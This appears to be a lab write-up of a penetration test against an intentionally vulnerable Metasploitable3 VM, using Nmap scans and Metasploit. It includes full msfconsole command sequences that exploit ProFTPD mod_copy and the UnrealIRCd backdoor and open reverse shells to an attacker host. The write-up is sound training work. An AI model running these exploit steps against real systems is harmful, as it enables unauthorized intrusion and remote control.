# Penetration Testing

Network reconnaissance with Nmap and exploitation of critical vulnerabilities (CVE-2015-3306, CVE-2010-2075) using the Metasploit Framework against a deliberately vulnerable target system.

## Objective

Perform a full penetration testing workflow — reconnaissance, scanning, vulnerability identification, and exploitation — against a Metasploitable3 Ubuntu VM. Demonstrate how attackers chain information gathering with exploit execution to gain unauthorized system access.

## Tools and Technologies

- **Nmap** — network scanner and service fingerprinter
- **Metasploit Framework** (`msfconsole`) — exploitation framework
- **PostgreSQL** — Metasploit database backend
- **Kali Linux** — attacker machine
- **Metasploitable3 Ubuntu** — intentionally vulnerable target VM

### Exploits Used

| CVE | Service | Vulnerability |
|-----|---------|---------------|
| CVE-2015-3306 | ProFTPD 1.3.5 | `mod_copy` module allows unauthenticated file copy to web-accessible directories |
| CVE-2010-2075 | UnrealIRCd 3.2.8.1 | Built-in backdoor allowing arbitrary command execution |

## Methodology

### Phase 1: Reconnaissance with Nmap

Executed five scan types against the target (10.0.2.15) to progressively build an attack surface map:

**1. OS Detection** (`nmap -O`)
Result: Linux 3.13-4.4 kernel, VirtualBox NIC detected.

**2. Top 20 Ports** (`nmap --top-ports 20`)
Open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 3306 (MySQL), 8080 (HTTP Proxy).

**3. Vulnerability Scripts** (`nmap --script vuln`)
Findings: Slowloris DoS (CVE-2007-6750), SQL injection indicators, CSRF vulnerabilities, exposed directories (`/drupal/`, `/phpmyadmin/`, `/chat/`), SMB signing disabled.

**4. Full Port Scan** (`nmap -p-`)
Ports 21, 22, 80 open; 443 filtered.

**5. Service Version + Default Scripts** (`nmap -sV -sC`)
Service fingerprints: ProFTPD 1.3.5, OpenSSH 6.6.1p1, Apache 2.4.7, Samba 4.3.11, CUPS 1.7, MySQL, Jetty 8.1.7.

### Phase 2: Exploitation

**Target A — ProFTPD mod_copy (CVE-2015-3306)**

```bash
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set payload cmd/unix/reverse_perl
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
set LHOST 10.0.2.4
exploit
```

Result: Payload PHP file uploaded to `/var/www/html`, reverse shell established. `whoami` returned `www-data` — web server-level access achieved.

**Target B — UnrealIRCd Backdoor (CVE-2010-2075)**

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set payload cmd/unix/reverse
set RHOSTS 10.0.2.15
set RPORT 6697
set LHOST 10.0.2.4
exploit
```

Result: Shell session opened. `whoami` returned `boba_fett`. System enumeration via `uname -a` returned `Linux ubuntu 3.13.0-24-generic`.

## Key Findings

- **Service fingerprinting reveals attack surface** — Nmap's `-sV -sC` scan identified exact software versions, enabling targeted exploit selection
- **ProFTPD mod_copy is a critical misconfiguration** — the SITE CPFR/CPTO commands allow unauthenticated users to copy arbitrary files into web directories
- **UnrealIRCd 3.2.8.1 contained a supply-chain backdoor** — the official source tarball was compromised, meaning even trusted installations were vulnerable
- **SMB signing disabled = MITM risk** — without signed SMB packets, attackers can intercept and modify file-sharing traffic
- **Defense priorities** — patch management, network segmentation, intrusion detection, and regular vulnerability scanning
